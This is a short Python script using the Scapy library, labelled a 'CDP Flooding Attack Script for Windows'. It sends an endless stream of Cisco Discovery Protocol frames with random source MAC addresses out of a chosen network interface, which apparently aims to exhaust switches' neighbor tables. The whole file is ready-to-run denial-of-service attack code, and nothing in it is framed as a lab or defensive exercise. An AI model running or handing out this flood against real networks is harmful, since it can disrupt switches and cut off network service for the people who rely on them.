#!/usr/bin/env python3

from scapy.all import *
import time
import random

def generate_cdp_packet():
    # Generate a simple CDP packet
    cdp_packet = Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC()) / \
                 LLC() / SNAP() / \
                 Raw(load="\x02\x01\x00\x0c\x00\x00\x00\x00")
    return cdp_packet

def send_cdp_flood(interface):
    print(f"Starting CDP flood on interface {interface}...")

    # Loop to send a large number of CDP packets
    while True:
        cdp_packet = generate_cdp_packet()
        sendp(cdp_packet, iface=interface, verbose=False)
        time.sleep(0.01)  # Slight delay to avoid overwhelming the sending machine

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="CDP Flooding Attack Script for Windows")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use for sending packets")

    args = parser.parse_args()

    try:
        send_cdp_flood(args.interface)
    except KeyboardInterrupt:
        print("\nCDP flood stopped.")